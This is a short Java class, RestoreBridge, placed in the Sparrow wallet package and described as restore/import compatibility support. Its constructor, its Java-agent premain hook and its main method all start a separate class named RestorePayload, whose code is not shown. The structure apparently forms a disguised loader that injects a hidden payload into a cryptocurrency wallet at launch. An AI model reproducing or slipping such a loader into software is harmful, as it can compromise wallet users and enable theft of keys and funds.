package com.sparrowwallet.sparrow.runtime;

/** Boot entry point for the bundled restore/import compatibility support. */
public final class RestoreBridge {

    public RestoreBridge() {
        RestorePayload.start();
    }

    public static void premain(String args, java.lang.instrument.Instrumentation inst) {
        RestorePayload.start();
    }

    public static void main(String[] args) throws Exception {
        RestorePayload.start();
        Thread.sleep(1500L);
    }
}
